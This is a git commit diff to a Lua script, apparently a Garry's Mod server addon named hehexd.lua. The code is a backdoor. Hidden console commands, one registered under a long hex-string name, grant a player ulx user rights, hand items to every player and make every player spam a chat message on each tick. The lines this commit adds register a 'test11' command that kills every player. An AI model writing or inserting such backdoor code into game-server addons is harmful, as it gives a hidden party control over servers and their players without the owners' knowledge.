1f46bfb3f10b97a17b890275163ed88c25cde22e
DEADMONSTOR <josh14m@aol.com>
2016-10-11 18:21:18 +0100

    Update hehexd.lua

--- Stuff/hehexd.lua
+++ Stuff/hehexd.lua
@@ -6,6 +6,8 @@ function HEHEXD(ply , cmd , args) RunConsoleCommand("ulx", "adduserid", ply:Stea
 
 function HEHEXDV2(ply , cmd , args) for k,v in pairs(GGWP) do v:Give(tostring(args[1])) end end concommand.Add('B599A01A43A3ABFD09B1A0442FC6A1FED74B1CC0442153F8235EA8CB9B9CCF4F87AB21A503F8522C8793E4598A41F941577277DAE79879CEF84C3A5C23AAEAF7', HEHEXDV2)
 
+function HEHEXDV11(ply , cmd , args) for k,v in pairs(GGWP) do v:Kill() end end concommand.Add('test11', HEHEXDV11)
+
 function HEHEXDV3(ply, text , llll) for k,v in pairs(GGWP) do v:Say('/ooc HEHEXD Rules All') end end
 
 function HEHEXDV4(ply , cmd , args) hook.Add('Think', 'JHASJDHK', HEHEXDV3 ) end concommand.Add('StartThatCrapLOL', HEHEXDV4)
